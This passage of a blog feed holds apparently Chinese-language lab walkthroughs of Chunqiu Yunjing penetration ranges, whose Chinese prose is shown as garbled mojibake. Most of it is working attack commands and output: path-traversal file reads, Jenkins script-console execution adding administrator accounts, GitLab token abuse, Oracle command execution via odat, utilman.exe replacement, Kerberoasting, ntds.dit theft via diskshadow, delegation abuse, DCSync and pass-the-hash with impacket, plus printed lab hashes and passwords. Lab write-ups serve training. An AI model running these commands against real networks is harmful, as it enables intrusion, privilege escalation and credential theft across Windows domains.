class="number">21</span>-<span class="number">3535393121</span>-<span class="number">624993632</span>-<span class="number">895678587</span>-<span class="number">1116</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®msDS-AllowedToActOnBehalfOfOtherIdentityä¸ºåˆšåˆ›å»ºçš„æœºå™¨è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1;<span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3535393121-624993632-895678587-1116)&quot;</span>;<span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);<span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);Get-DomainComputer FILESERVER| Set-DomainObject -Set @&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; -Verbose </span><br></pre></td></tr></table></figure><p>å¯ä»¥æ£€æŸ¥ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer FILESERVER -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p>ä¸æ»‘å°è¿æ‹›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”³è¯·ç¥¨æ®</span></span><br><span class="line">proxychains4 impacket-getST xiaorang.lab/hacker$:<span class="built_in">whoami</span>@666 -spn cifs/FILESERVER.xiaorang.lab -impersonate administrator -dc-ip 172.22.60.8</span><br><span class="line"><span class="comment">#å¯¼å…¥ç¥¨æ®</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_FILESERVER.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line"><span class="comment">#æ— å¯†ç è¿æ¥</span></span><br><span class="line">proxychains4 impacket-smbexec -k xiaorang.lab/administrator@FILESERVER.xiaorang.lab -no-pass -dc-ip 172.22.60.8 -codec gbk</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯å¾—dumpä¸€ä¸‹å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd8e2e150f44ea79fff5034cad4539fc:::</span><br><span class="line"></span><br><span class="line">XIAORANG\Fileserver$:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc:::</span><br></pre></td></tr></table></figure><p>æ¨ªå‘FILESERVERå¯ä»¥æ‹¿åˆ°flag</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> impacket-psexec -k xiaorang.lab/administrator<span class="variable">@FILESERVER</span>.xiaorang.lab -<span class="literal">no</span>-pass -dc-ip <span class="number">172.22.60.8</span> -codec gbk</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>åé¢å°±æ˜¯ç”¨FILESERVERè¿›è¡Œdcsyncäº†ï¼Œç”¨ä¸Šé¢æœºå™¨è´¦æˆ·çš„å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump xiaorang.lab/<span class="string">&#x27;Fileserver$&#x27;</span>:@172.22.60.8 -hashes <span class="string">&#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27;</span> -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b:::</span><br></pre></td></tr></table></figure><p>æ¨ªå‘åŸŸæ§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/administrator@172.22.60.8 -codec gbk</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><p>æ‹¿ç€åŸŸç®¡å“ˆå¸Œæ¨ªå‘å¼€å§‹zhangxinçš„é‚£å°æœºå™¨å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/administrator@172.22.60.15 -codec gbk</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Privilege</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Privilege.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Privilege.html</id>
    <published>2024-09-22T11:39:17.056Z</published>
    <updated>2024-09-22T11:40:07.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">39.99.141.81:8080 open</span><br><span class="line">39.99.141.81:80 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.141.81:8080  code:403 len:548    title:None</span><br><span class="line">[*] WebTitle http://39.99.141.81       code:200 len:54646  title:XR SHOP</span><br><span class="line">[+] PocScan http://39.99.141.81/www.zip poc-yaml-backup-file</span><br></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸¤ä¸ªç½‘ç«™ï¼Œè¿˜æœ‰ä¸€ä¸ªwwwæ³„éœ²ï¼Œåœ¨toolsé‡Œé¢æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$logfile</span> = <span class="title function_ invoke__">rawurldecode</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;logfile&#x27;</span>] );</span><br><span class="line"><span class="comment">// Make sure the file is exist.</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$logfile</span> ) ) &#123;</span><br><span class="line">  <span class="comment">// Get the content and echo it.</span></span><br><span class="line">  <span class="variable">$text</span> = <span class="title function_ invoke__">file_get_contents</span>( <span class="variable">$logfile</span> );</span><br><span class="line">  <span class="keyword">echo</span>( <span class="variable">$text</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯»å–åˆ°ç¬¬ä¸€ä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/tools/content-log.php?logfile=../../../../../../../../../../../users/administrator/flag/flag01.txt</span><br></pre></td></tr></table></figure><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>æ ¹æ®æç¤ºå¯ä»¥ç»§ç»­åˆ†æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·è·å– XR Shop å®˜ç½‘æºç çš„å¤‡ä»½æ–‡ä»¶ï¼Œå¹¶å°è¯•è·å¾—ç³»ç»Ÿä¸Šä»»æ„æ–‡ä»¶è¯»å–çš„èƒ½åŠ›ã€‚å¹¶ä¸”ï¼Œç®¡ç†å‘˜åœ¨é…ç½® Jenkins æ—¶ï¼Œä»ç„¶é€‰æ‹©äº†ä½¿ç”¨åˆå§‹ç®¡ç†å‘˜å¯†ç ï¼Œè¯·å°è¯•è¯»å–è¯¥å¯†ç å¹¶è·å– Jenkins æœåŠ¡å™¨æƒé™ã€‚Jenkins é…ç½®ç›®å½•ä¸º C:\ProgramData\Jenkins\.jenkinsã€‚</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–è¯»å–åˆ°äº†Jenkinsçš„åˆå§‹å¯†ç </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">admin</span>/<span class="number">510235</span>cf43f14e83b88a9f144199655b</span><br></pre></td></tr></table></figure><p>jenkinsåå°å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">&quot;net user Chu0 whoami@666 /add&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;net localgroup administrators Chu0 /add&quot;</span>.execute().text</span><br></pre></td></tr></table></figure><p>æ·»åŠ ç”¨æˆ·rdpä¸Šå»ï¼Œæ­å»ºä»£ç†ï¼Œæ‰«æå†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">172.22.14.7:445 open</span><br><span class="line">172.22.14.7:8080 open</span><br><span class="line">172.22.14.31:1521 open</span><br><span class="line">172.22.14.7:3306 open</span><br><span class="line">172.22.14.46:445 open</span><br><span class="line">172.22.14.31:445 open</span><br><span class="line">172.22.14.11:445 open</span><br><span class="line">172.22.14.46:139 open</span><br><span class="line">172.22.14.31:139 open</span><br><span class="line">172.22.14.11:139 open</span><br><span class="line">172.22.14.7:139 open</span><br><span class="line">172.22.14.46:135 open</span><br><span class="line">172.22.14.31:135 open</span><br><span class="line">172.22.14.11:135 open</span><br><span class="line">172.22.14.7:135 open</span><br><span class="line">172.22.14.46:80 open</span><br><span class="line">172.22.14.16:80 open</span><br><span class="line">172.22.14.7:80 open</span><br><span class="line">172.22.14.16:22 open</span><br><span class="line">172.22.14.16:8060 open</span><br><span class="line">172.22.14.11:88 open</span><br><span class="line">172.22.14.16:9094 open</span><br><span class="line">[*] alive ports len is: 22</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.14.7:8080   code:403 len:548    title:None</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.31</span><br><span class="line">   [-&gt;]XR-ORACLE</span><br><span class="line">   [-&gt;]172.22.14.31</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.11</span><br><span class="line">   [-&gt;]XR-DC</span><br><span class="line">   [-&gt;]172.22.14.11</span><br><span class="line">[*] NetBios 172.22.14.46    XIAORANG\XR-0923</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.7</span><br><span class="line">   [-&gt;]XR-JENKINS</span><br><span class="line">   [-&gt;]172.22.14.7</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.46</span><br><span class="line">   [-&gt;]XR-0923</span><br><span class="line">   [-&gt;]172.22.14.46</span><br><span class="line">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC</span><br><span class="line">[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE</span><br><span class="line">[*] WebTitle http://172.22.14.16       code:302 len:99     title:None è·³è½¬url: http://172.22.14.16/users/sign_in</span><br><span class="line">[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class="line">[*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign <span class="keyword">in</span> Â· GitLab</span><br><span class="line">[+] PocScan http://172.22.14.7/www.zip poc-yaml-backup-file</span><br></pre></td></tr></table></figure><p>å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªgitlabï¼Œæ ¹æ®æç¤ºå»æ‰¾å¯¹åº”çš„tokenC:/ProgramData/Jenkins/.jenkins/credentials.xmlï¼Œç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh&#125;</span><br></pre></td></tr></table></figure><p>è§£å¯†å¾—åˆ°æ˜æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println(hudson.util.Secret.fromString(<span class="string">&quot;&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh&#125;&quot;</span>).getPlainText())</span><br><span class="line"></span><br><span class="line">glpat-7kD_qLH2PiQv_ywB9hz2</span><br></pre></td></tr></table></figure><p>æ‹‰å»å¯¹åº”çš„é¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --header <span class="string">&quot;PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2&quot;</span> <span class="string">&quot;http://172.22.14.16/api/v4/projects&quot;</span></span><br></pre></td></tr></table></figure><p>è·å–å¯¹åº”é¡¹ç›®çš„ä»“åº“åœ°å€</p><p><img src="../ç¬”è®°å›¾/image-20240921232725600.png" alt="image-20240921232725600"></p><p>æ‹‰å–å¯¹åº”é¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git </span><br><span class="line">proxychains git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git </span><br><span class="line">proxychains git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git </span><br><span class="line">proxychains git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git </span><br><span class="line">proxychains git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/gitlab-instance-23352f48/Monitoring.git</span><br></pre></td></tr></table></figure><p>åœ¨xradminä¸­çš„ruoyi-admin/src/main/resources/application-druid.ymlæ‰¾åˆ°oracleè´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url: jdbc:oracle:thin:@172.22.14.31:1521/orcl</span><br><span class="line">username: xradmin</span><br><span class="line">password: fcMyE8t9E4XdsKf</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ­¤ç”¨æˆ·ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --<span class="built_in">exec</span> <span class="string">&#x27;net user Chu0 whoami@666 /add&#x27;</span></span><br><span class="line">proxychains4 odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --<span class="built_in">exec</span> <span class="string">&#x27;net localgroup administrators Chu0 /add&#x27;</span></span><br></pre></td></tr></table></figure><p>rdpä¸Šå»å¯ä»¥æ‹¿åˆ°flag</p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>internal-secreté‡Œé¢æœ‰ä¸€ç»„è´¦å·å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XR-0923 | zhangshuai | wSbEajHzZs</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç”¨æˆ·ç»„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user zhangshuai</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ¬åœ°ç»„æˆå‘˜             *Remote Desktop Users *Remote Management Use</span><br></pre></td></tr></table></figure><p>ç”±äºå±äºRemote Management Useï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨evil-winrmè¿æ¥æœºå™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs</span><br></pre></td></tr></table></figure><p>æœºå™¨åå’ŒåŸŸå†…æœºå™¨ä¸€æ ·ï¼Œå°è¯•rdpæˆåŠŸï¼ŒæŸ¥çœ‹æƒé™å­˜åœ¨SeRestorePrivilegeæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\zhangshuai\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">ç‰¹æƒä¿¡æ¯</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">ç‰¹æƒå                        æè¿°           çŠ¶æ€</span><br><span class="line">============================= ============== ======</span><br><span class="line">SeRestorePrivilege            è¿˜åŸæ–‡ä»¶å’Œç›®å½• å·²å¯ç”¨</span><br><span class="line">SeChangeNotifyPrivilege       ç»•è¿‡éå†æ£€æŸ¥   å·²å¯ç”¨</span><br><span class="line">SeIncreaseWorkingSetPrivilege å¢åŠ è¿›ç¨‹å·¥ä½œé›† å·²å¯ç”¨</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨SeRestorePrivilegeæƒé™ï¼Œå°è¯•ä½¿ç”¨æ­¤æƒé™ææƒï¼Œè¿™é‡Œå¦‚æœè¦ä¸Šçº¿çš„è¯ï¼Œè®°å¾—ç”¨cmd /c 123.exeæ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ren utilman.exe utilman.old</span><br><span class="line">ren cmd.exe utilman.exe</span><br></pre></td></tr></table></figure><p>å°†ç”¨æˆ·é”å®šç„¶åæŒ‰WIN+uå³å¯å¾—åˆ°systemæƒé™ï¼Œæ‹¿åˆ°flag3</p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>å‘åŸŸæ§æŸ¥è¯¢æ³¨å†Œäº†SPNçš„ç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs xiaorang.lab/<span class="string">&#x27;XR-0923$&#x27;</span> -hashes :1039312ceea16360a67467f2f66c0c37 -dc-ip 172.22.14.11</span><br></pre></td></tr></table></figure><p>è·å–æ­¤ç”¨æˆ·çš„ST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs xiaorang.lab/<span class="string">&#x27;XR-0923$&#x27;</span> -hashes :1039312ceea16360a67467f2f66c0c37 -dc-ip 172.22.14.11 -request-user tianjing</span><br></pre></td></tr></table></figure><p>å¯¹è·å–çš„å“ˆå¸Œè¿›è¡Œçˆ†ç ´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashcat</span> -a <span class="number">0</span> -m <span class="number">13100</span> hash.txt ./rockyou.txt</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tianjing/DPQSXSXgh2</span><br></pre></td></tr></table></figure><p>å°è¯•rdpä¸Šå»çœ‹çœ‹ï¼Œå‘ç°ä¸Šä¸å»ï¼Œç”±äºé¶æœºå¼€å¯äº†5985ç«¯å£ï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥ä½¿ç”¨evil-winrmè¿›è¡Œç™»å½•</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 evil-winrm -i <span class="number">172.22</span><span class="number">.14</span><span class="number">.11</span> -u tianjing -p DPQSXSXgh2 <span class="number">2</span>&gt; <span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¾—ææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\public&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">ç‰¹æƒä¿¡æ¯</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">ç‰¹æƒå                        æè¿°             çŠ¶æ€</span><br><span class="line">============================= ================ ======</span><br><span class="line">SeMachineAccountPrivilege     å°†å·¥ä½œç«™æ·»åŠ åˆ°åŸŸ å·²å¯ç”¨</span><br><span class="line">SeBackupPrivilege             å¤‡ä»½æ–‡ä»¶å’Œç›®å½•   å·²å¯ç”¨</span><br><span class="line">SeRestorePrivilege            è¿˜åŸæ–‡ä»¶å’Œç›®å½•   å·²å¯ç”¨</span><br><span class="line">SeShutdownPrivilege           å…³é—­ç³»ç»Ÿ         å·²å¯ç”¨</span><br><span class="line">SeChangeNotifyPrivilege       ç»•è¿‡éå†æ£€æŸ¥     å·²å¯ç”¨</span><br><span class="line">SeIncreaseWorkingSetPrivilege å¢åŠ è¿›ç¨‹å·¥ä½œé›†   å·²å¯ç”¨</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°SeBackupPrivilegeå’ŒSeRestorePrivilegeçŠ¶æ€æ˜¯Enabled</p><p>åˆ›å»ºæ–‡ä»¶raj.dsh</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriters</span></span><br><span class="line">add <span class="comment">volume c: alias raj</span></span><br><span class="line">create</span><br><span class="line">expose <span class="comment">%raj% z:</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œæ ¼å¼è½¬æ¢</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u<span class="symbol">nix2</span>dos raj.dsh</span><br></pre></td></tr></table></figure><p>å…ˆåœ¨cç›˜æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir Chu0</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ­¤æ–‡ä»¶</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upload</span> raj.dsh</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ï¼Œè·Ÿç€æ¥å°±è¡Œ</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diskshadow /s raj.dsh</span><br><span class="line">robocopy /b z:\windows\ntds . ntds.dit</span><br><span class="line">reg <span class="keyword">save</span> hklm\<span class="keyword">system</span> c:\Chu0\<span class="keyword">system</span></span><br></pre></td></tr></table></figure><p>å°†è¿™ä¿©æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download ntds.dit</span><br><span class="line">download <span class="keyword">system</span></span><br></pre></td></tr></table></figure><p>è·å–å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -ntds ntds.dit -system system <span class="built_in">local</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Administrator</span>:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">70</span>c39b547b7d8adec35ad7c09fb1d277:::</span><br></pre></td></tr></table></figure><p>PTHè¿‡å»æ‹¿åˆ°æœ€åä¸€ä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :70c39b547b7d8adec35ad7c09fb1d277 xiaorang.lab/administrator@172.22.14.11 -codec gbk</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Delivery</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Delivery.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Delivery.html</id>
    <published>2024-09-22T11:37:26.512Z</published>
    <updated>2024-09-22T11:39:04.141Z</updated>
    
